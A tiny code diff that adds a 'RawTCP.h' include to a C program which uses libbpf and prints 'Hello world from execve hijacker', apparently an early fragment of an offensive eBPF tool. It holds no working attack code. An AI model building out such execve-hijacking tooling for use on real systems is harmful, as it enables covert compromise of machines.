@@ -9,6 +9,8 @@
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
 
+#include "lib/RawTCP.h"
+
 int main(int argc, char* argv[]){
     printf("Hello world from execve hijacker\n");
 
